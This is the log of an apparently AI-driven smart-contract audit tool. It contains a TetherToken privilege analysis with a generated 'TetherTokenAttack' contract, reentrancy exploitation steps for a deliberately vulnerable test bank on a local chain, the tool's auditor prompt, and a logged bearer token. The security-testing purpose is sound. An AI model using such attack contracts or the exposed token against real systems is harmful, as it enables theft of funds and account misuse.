hardcoded limits.  \n\nSolidity version:  \n```solidity\npragma solidity ^0.4.17;\n```\n\n---\n\n2. Vulnerability Assessment:\n\n**A. Centralization / Owner Privileges**  \n- The owner has extensive control: can pause/unpause transfers, blacklist addresses, destroy blacklisted users‚Äô tokens, issue new tokens, redeem tokens, change fee parameters, and deprecate the contract.  \n- This centralization means the owner can arbitrarily freeze token transfers, confiscate tokens from blacklisted users, inflate or deflate supply, and redirect token logic to a new contract.  \n- While this may be intended, it poses a trust risk and potential for abuse or compromise.\n\n**B. Blacklist and Destroy Black Funds**  \n- The owner can blacklist any address and then destroy all tokens held by that address, reducing total supply.  \n- This is a powerful backdoor to confiscate tokens without user consent.  \n- No timelock or multi-signature protection is present on these critical functions.\n\n**C. Upgradeability and Deprecation**  \n- The `deprecate` function allows the owner to mark the contract as deprecated and set an upgraded contract address.  \n- After deprecation, all token operations forward to the upgraded contract.  \n- This means the owner can effectively replace the token logic at will, which could lead to malicious upgrades or loss of funds if the upgraded contract is malicious or buggy.\n\n**D. Pausable Mechanism**  \n- The owner can pause all token transfers, freezing user funds.  \n- No emergency recovery or decentralized control is implemented.\n\n**E. ERC20 Approve Race Condition Mitigation**  \n- The contract implements the known mitigation by requiring allowance to be zero before setting a new non-zero allowance.  \n- This is good practice, no issue here.\n\n**F. Fee Calculation and Limits**  \n- Fees are calculated as basis points of the transfer amount, capped by a maximum fee.  \n- The owner can set fees but only up to 0.2% (20 basis points) and max fee less than 50 tokens (scaled by decimals).  \n- This limit is hardcoded and prevents excessive fees.\n\n**G. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.  \n- No external calls in token transfer functions that could cause reentrancy.  \n- No payable functions accepting ETH, so no direct ETH theft risk.\n\n**H. Short Address Attack Mitigation**  \n- The `onlyPayloadSize` modifier is used to prevent short address attacks on transfer, transferFrom, and approve.\n\n---\n\n3. Exploitation Requirements:\n\n- **Owner Key Compromise**: The main risk vector is compromise or malicious behavior of the owner account. If an attacker gains control of the owner key, they can:  \n  - Pause the contract, freezing all transfers.  \n  - Blacklist arbitrary users and destroy their tokens.  \n  - Issue new tokens to inflate supply and potentially dump them.  \n  - Redeem tokens from owner balance to reduce supply arbitrarily.  \n  - Change fee parameters within limits.  \n  - Deprecate the contract and redirect logic to a malicious upgraded contract.\n\n- **No direct user-exploitable bugs**: There is no direct vulnerability exploitable by regular users or attackers without owner privileges. The contract logic is standard and uses SafeMath.\n\n- **Setup for Exploitation**:  \n  - The attacker must gain control of the owner private key or the owner must act maliciously.  \n  - No other setup is needed.\n\n---\n\n**Summary:**  \nThis contract is a classic example of a centrally controlled token with owner privileges that can affect user balances and token behavior arbitrarily. There are no technical bugs like reentrancy or math errors, but the design inherently trusts the owner with powerful controls that can be abused or compromised, leading to confiscation, freezing, or inflation of tokens.\n\n---\n\n# Final Report\n\n**Contract:** TetherToken  \n**Solidity Version:** ^0.4.17\n\n**Vulnerabilities:**  \n- Centralized owner privileges allow freezing transfers, blacklisting users, destroying tokens, minting new tokens, and upgrading contract logic arbitrarily.  \n- Blacklist and destroyBlackFunds functions act as a backdoor to confiscate tokens.  \n- Upgradeability mechanism allows owner to redirect token logic to any contract, potentially malicious.  \n- Pausable mechanism controlled solely by owner can freeze all token transfers.  \n\n**Potential Impact:**  \n- Loss of user funds via token confiscation or freezing.  \n- Inflation or deflation of token supply by owner.  \n- Forced upgrade to malicious contract.  \n- Complete loss of user control and trust.\n\n**Exploitation Requirements:**  \n- Owner private key compromise or malicious owner action.\n\n---\n\nNo other technical vulnerabilities (reentrancy, math errors, unsafe calls) were found.', 'reasoning': 'The analyzed contract is **TetherToken**, an ERC20 token implementation with additional features such as pausability, blacklisting, token upgradeability, and adjustable fees. It inherits from multiple contracts: `Pausable`, `StandardToken`, and `BlackList`. The contract holds token balances and can be used to transfer tokens, approve allowances, and manage token supply via issuing and redeeming tokens. It also supports pausing all token transfers and blacklisting addresses to restrict their token operations. The contract supports deprecation, forwarding calls to an upgraded contract address.\n\nKey features and business logic:  \n- Token transfers with optional fees (basis points and max fee).  \n- Pausable functionality controlled by the owner.  \n- Blacklist mechanism to block malicious users and destroy their tokens.  \n- Ability to issue and redeem tokens by the owner, affecting total supply.  \n- Upgradeability via deprecate function, forwarding calls to a new contract.  \n- Protection against ERC20 short address attack via `onlyPayloadSize` modifier.  \n- Fee parameters capped by hardcoded limits.  \n\nSolidity version:  \n```solidity\npragma solidity ^0.4.17;\n```\n\n---\n\n2.', 'summary': '**A. Centralization / Owner Privileges**  \n- The owner has extensive control: can pause/unpause transfers, blacklist addresses, destroy blacklisted users‚Äô tokens, issue new tokens, redeem tokens, change fee parameters, and deprecate the contract.  \n- This centralization means the owner can arbitrarily freeze token transfers, confiscate tokens from blacklisted users, inflate or deflate supply, and redirect token logic to a new contract.  \n- While this may be intended, it poses a trust risk and potential for abuse or compromise.\n\n**B. Blacklist and Destroy Black Funds**  \n- The owner can blacklist any address and then destroy all tokens held by that address, reducing total supply.  \n- This is a powerful backdoor to confiscate tokens without user consent.  \n- No timelock or multi-signature protection is present on these critical functions.\n\n**C. Upgradeability and Deprecation**  \n- The `deprecate` function allows the owner to mark the contract as deprecated and set an upgraded contract address.  \n- After deprecation, all token operations forward to the upgraded contract.  \n- This means the owner can effectively replace the token logic at will, which could lead to malicious upgrades or loss of funds if the upgraded contract is malicious or buggy.\n\n**D. Pausable Mechanism**  \n- The owner can pause all token transfers, freezing user funds.  \n- No emergency recovery or decentralized control is implemented.\n\n**E. ERC20 Approve Race Condition Mitigation**  \n- The contract implements the known mitigation by requiring allowance to be zero before setting a new non-zero allowance.  \n- This is good practice, no issue here.\n\n**F. Fee Calculation and Limits**  \n- Fees are calculated as basis points of the transfer amount, capped by a maximum fee.  \n- The owner can set fees but only up to 0.2% (20 basis points) and max fee less than 50 tokens (scaled by decimals).  \n- This limit is hardcoded and prevents excessive fees.\n\n**G. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.  \n- No external calls in token transfer functions that could cause reentrancy.  \n- No payable functions accepting ETH, so no direct ETH theft risk.\n\n**H. Short Address Attack Mitigation**  \n- The `onlyPayloadSize` modifier is used to prevent short address attacks on transfer, transferFrom, and approve.\n\n---\n\n3.', 'code': 'pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function pause() external;\n    function unpause() external;\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function issue(address _to, uint _amount) external;\n    function redeem(uint _amount) external;\n    function setParams(uint newBasisPoints, uint newMaxFee) external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenAttack {\n    ITetherToken public target;\n\n    function TetherTokenAttack(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address upgradedContract, uint issueAmount, uint redeemAmount, uint newBasisPoints, uint newMaxFee) public {\n        target.pause();\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.issue(this, issueAmount);\n        target.redeem(redeemAmount);\n        target.setParams(newBasisPoints, newMaxFee);\n        target.deprecate(upgradedContract);\n        target.unpause();\n    }\n}', 'code_type': 'solidity', 'duration': 45.77956008911133}
2025-06-23 15:08:02,086 - app.services.contract_service - INFO - Has exploit code: True
2025-06-23 15:08:02,088 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-06-23 15:08:02,089 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-06-23 15:08:02,091 - app.services.contract_service - INFO - Attack strategy summary: **A. Centralization / Owner Privileges**  
- The owner has extensive control: can pause/unpause transfers, blacklist addresses, destroy blacklisted users‚Äô tokens, issue new tokens, redeem tokens, change fee parameters, and deprecate the contract.  
- This centralization means the owner can arbitrarily freeze token transfers, confiscate tokens from blacklisted users, inflate or deflate supply, and redirect token logic to a new contract.  
- While this may be intended, it poses a trust risk and potential for abuse or compromise.

**B. Blacklist and Destroy Black Funds**  
- The owner can blacklist any address and then destroy all tokens held by that address, reducing total supply.  
- This is a powerful backdoor to confiscate tokens without user consent.  
- No timelock or multi-signature protection is present on these critical functions.

**C. Upgradeability and Deprecation**  
- The `deprecate` function allows the owner to mark the contract as deprecated and set an upgraded contract address.  
- After deprecation, all token operations forward to the upgraded contract.  
- This means the owner can effectively replace the token logic at will, which could lead to malicious upgrades or loss of funds if the upgraded contract is malicious or buggy.

**D. Pausable Mechanism**  
- The owner can pause all token transfers, freezing user funds.  
- No emergency recovery or decentralized control is implemented.

**E. ERC20 Approve Race Condition Mitigation**  
- The contract implements the known mitigation by requiring allowance to be zero before setting a new non-zero allowance.  
- This is good practice, no issue here.

**F. Fee Calculation and Limits**  
- Fees are calculated as basis points of the transfer amount, capped by a maximum fee.  
- The owner can set fees but only up to 0.2% (20 basis points) and max fee less than 50 tokens (scaled by decimals).  
- This limit is hardcoded and prevents excessive fees.

**G. No Reentrancy or Math Vulnerabilities**  
- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.  
- No external calls in token transfer functions that could cause reentrancy.  
- No payable functions accepting ETH, so no direct ETH theft risk.

**H. Short Address Attack Mitigation**  
- The `onlyPayloadSize` modifier is used to prevent short address attacks on transfer, transferFrom, and approve.

---

3.
2025-06-23 15:08:02,093 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-06-23 15:08:02,095 - app.services.contract_service - INFO - Temporary file /tmp/tmpn0n66fsk.sol removed
2025-06-23 15:08:02,146 - app.api.contract - INFO - Report saved with filename: Ownable_2025-06-23_15-08, status: KO
2025-06-23 15:08:02,149 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-23 15:08:02,152 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 15:08:02,153 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 15:08:02,155 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 15:08:02,156 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 15:08:02,159 - werkzeug - INFO - 192.168.144.1 - - [23/Jun/2025 15:08:02] "POST /analyze HTTP/1.1" 200 -
2025-07-05 13:04:34,395 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-05 13:04:34,584 - app.app - INFO - Application started
2025-07-05 13:04:34,596 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.96.5:8000
2025-07-05 13:04:34,597 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-07-05 13:04:35,531 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:04:35,534 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:04:35,536 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:04:35,538 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:04:35,543 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:04:35] "OPTIONS /login HTTP/1.1" 200 -
2025-07-05 13:04:35,555 - app.api.auth - INFO - Received login request with method: POST
2025-07-05 13:04:35,557 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3MjQwMzZ9.PuUygv29r5DJqN8_VAsxB6v3v3wQKzKJyyxsFG0U6kw', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-05 13:04:35,559 - app.api.auth - INFO - Request content type: application/json
2025-07-05 13:04:35,560 - app.api.auth - INFO - Processing JSON request
2025-07-05 13:04:35,563 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:04:36,055 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:04:36,062 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:04:36,065 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:04:36,067 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:04:36,068 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:04:36,070 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:04:36] "POST /login HTTP/1.1" 200 -
2025-07-05 13:04:43,762 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:04:43,788 - app.api.contract - INFO - Analyzing code snippet
2025-07-05 13:04:43,812 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-07-05 13:04:43,819 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpxl6fuff8.sol
2025-07-05 13:04:43,830 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-05 13:04:43,832 - app.services.contract_service - INFO - Compiling contract...
2025-07-05 13:04:44,009 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-07-05 13:04:44,994 - solcx - INFO - Using solc version 0.8.0
2025-07-05 13:04:44,996 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-07-05 13:04:45,001 - solcx - INFO - Using solc version 0.8.0
2025-07-05 13:04:46,003 - app.services.contract_service - INFO - Compilation result: 1 contracts compiled
2025-07-05 13:04:46,005 - app.services.contract_service - INFO - Deploying 1 contracts...
2025-07-05 13:04:46,503 - app.services.contract_service - INFO - Contract VulnerableBank deployed at 0x5b1869D9A4C187F2EAa108f3062412ecf0526b24
2025-07-05 13:04:46,504 - app.services.contract_service - INFO - Setting up contract VulnerableBank...
2025-07-05 13:04:46,983 - app.services.contract_service - INFO - Contract VulnerableBank setup completed
2025-07-05 13:04:46,984 - app.services.contract_service - INFO - Funding contract VulnerableBank for attack testing...
2025-07-05 13:04:47,511 - app.services.contract_service - INFO - Contract VulnerableBank funded
2025-07-05 13:04:47,512 - app.services.contract_service - INFO - Building contract observation...
2025-07-05 13:04:48,019 - app.services.contract_service - INFO - Contract observation built successfully
2025-07-05 13:04:48,021 - app.services.contract_service - INFO - Generating attack strategy...
2025-07-05 13:04:48,022 - app.services.contract_service - INFO - Running Slither analysis...
2025-07-05 13:04:48,033 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-07-05 13:04:48,057 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 152, in slither_analyze
    slither_result = run_slither(sol_path, json_path, solc_version)
                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/app/modules/slither_scan.py", line 69, in run_slither
    ensure_solc_version(solc_version)
  File "/app/modules/slither_scan.py", line 44, in ensure_solc_version
    raise EnvironmentError("solc-select non trouv√© : installe-le via pip install solc-select")
OSError: solc-select non trouv√© : installe-le via pip install solc-select

2025-07-05 13:04:48,059 - app.modules.attack_generator - INFO - Starting complete attack strategy generation
2025-07-05 13:04:48,061 - app.modules.attack_generator - INFO - Contract name: VulnerableBank
2025-07-05 13:04:48,061 - app.modules.attack_generator - INFO - Using step number: 0 for model selection
2025-07-05 13:04:48,062 - app.modules.attack_generator - INFO - üîç Step 1: Analyzing contracts for vulnerabilities...
2025-07-05 13:04:48,065 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:04:48,067 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:04:48,068 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:05:02,219 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:05:02,264 - app.modules.attack_generator - INFO - Received response from OpenAI API in 14.20 seconds
2025-07-05 13:05:02,272 - app.modules.attack_generator - INFO - Contract analysis completed in 14.20 seconds
2025-07-05 13:05:02,273 - app.modules.attack_generator - INFO - Vulnerability assessment: **Reentrancy Vulnerability**:  
The `withdraw` function is vulnerable to a classic reentrancy attack...
2025-07-05 13:05:02,274 - app.modules.attack_generator - INFO - ‚öîÔ∏è Step 2: Generating attack code...
2025-07-05 13:05:02,276 - app.modules.attack_generator - INFO - [MODE] Utilisation du gros mod√®le (GPT-4)
2025-07-05 13:05:02,277 - app.modules.attack_generator - INFO - Querying OpenAI GPT-4 API with temperature=0.2, max_tokens=1800
2025-07-05 13:05:02,278 - app.modules.attack_generator - INFO - Sending request to OpenAI API...
2025-07-05 13:05:06,287 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-07-05 13:05:06,308 - app.modules.attack_generator - INFO - Received response from OpenAI API in 4.03 seconds
2025-07-05 13:05:06,314 - app.modules.attack_generator - INFO - Attack code generation completed in 4.03 seconds
2025-07-05 13:05:06,317 - app.modules.attack_generator - INFO - Generated attack code of type solidity with length 959
2025-07-05 13:05:06,319 - app.modules.attack_generator - INFO - Total attack strategy generation completed in 18.23 seconds
2025-07-05 13:05:06,321 - app.modules.attack_generator - INFO - Attack strategy generation completed successfully
2025-07-05 13:05:06,326 - app.services.contract_service - INFO - Attack strategy generated successfully: {'analysis': {'analysis_prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmpxl6fuff8.sol",\n  "contracts": [\n    {\n      "contract_name": "VulnerableBank",\n      "address": "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24",\n      "abi": [\n        {\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "deposit",\n          "outputs": [],\n          "stateMutability": "payable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "name": "getBalance",\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "withdraw",\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "type": "function"\n        }\n      ],\n      "functions": [\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "internalType": "address",\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deposit",\n          "signature": "deposit()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "payable",\n          "payable": true,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBalance",\n          "signature": "getBalance()",\n          "inputs": [],\n          "outputs": [\n            {\n              "internalType": "uint256",\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "withdraw",\n          "signature": "withdraw(uint256)",\n          "inputs": [\n            {\n              "internalType": "uint256",\n              "name": "_amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x5b1869D9A4C187F2EAa108f3062412ecf0526b24": 3000000000000000000,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99984357320000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 3000000000000000000,\n        "_contract_eth_balance_eth": 3.0,\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 0\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 3000000000000000000\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getBalance": 0\n      },\n      "source_code_snippet": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract VulnerableBank {\\n    mapping(address => uint256) public balances;\\n\\n    // Fonction pour d\\u00e9poser des fonds\\n    function deposit() public payable {\\n        balances[msg.sender] += msg.value;\\n    }\\n\\n    // Fonction vuln\\u00e9rable de retrait\\n    function withdraw(uint256 _amount) public {\\n        require(balances[msg.sender] >= _amount, \\"Solde insuffisant\\");\\n\\n        // Envoi du montant demand\\u00e9\\n        (bool success, ) = msg.sender.call{value: _amount}(\\"\\");\\n        require(success, unicode\\"\\u00c9chec du transfert\\");\\n\\n        // Mise \\u00e0 jour du solde APR\\u00c8S le transfert\\n        balances[msg.sender] -= _amount;\\n    }\\n\\n    // Consulter le solde\\n    function getBalance() public view returns (uint256) {\\n        return balances[msg.sender];\\n    }\\n}",\n      "solc_version": "0.8.0"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': '1. Contract Analysis:  \nThe contract `VulnerableBank` is a simple bank-like contract that allows users to deposit ETH and withdraw their deposited ETH. It maintains a `balances` mapping to track user deposits. The key functions are:  \n- `deposit()`: payable function that increases the caller‚Äôs balance by the sent amount.  \n- `withdraw(uint256 _amount)`: allows a user to withdraw a specified amount if they have sufficient balance. The function sends ETH to the caller using a low-level call, then updates the user‚Äôs balance after the transfer.  \n- `getBalance()`: returns the caller‚Äôs balance.\n\nThe contract is written in Solidity 0.8.0.\n\n2. Vulnerability Assessment:  \n**Reentrancy Vulnerability**:  \nThe `withdraw` function is vulnerable to a classic reentrancy attack because it:  \n- Sends ETH to the caller via `msg.sender.call{value: _amount}("")` before updating the user‚Äôs balance.  \n- The balance is updated **after** the external call.  \n\nThis allows an attacker contract to reenter the `withdraw` function during the external call and withdraw funds multiple times before the balance is updated, draining the contract‚Äôs ETH.\n\n**Mechanism:**  \n- Attacker deposits some ETH to have a positive balance.  \n- Calls `withdraw` to withdraw some amount.  \n- During the external call to `msg.sender.call`, the attacker‚Äôs fallback or receive function calls `withdraw` again before the balance is reduced.  \n- This repeats until the contract‚Äôs ETH is drained or the attacker stops.\n\n**Potential Impact:**  \n- Complete or partial draining of the contract‚Äôs ETH balance.  \n- Loss of user funds stored in the contract.\n\nNo other major vulnerabilities like permission issues or math errors are apparent since Solidity 0.8.0 has built-in overflow checks and the contract does not have owner-only functions or complex logic.\n\n3. Exploitation Requirements:  \n- The attacker must deploy a malicious contract with a fallback or receive function that calls `withdraw` again.  \n- The attacker must first deposit ETH into the `VulnerableBank` to have a positive balance.  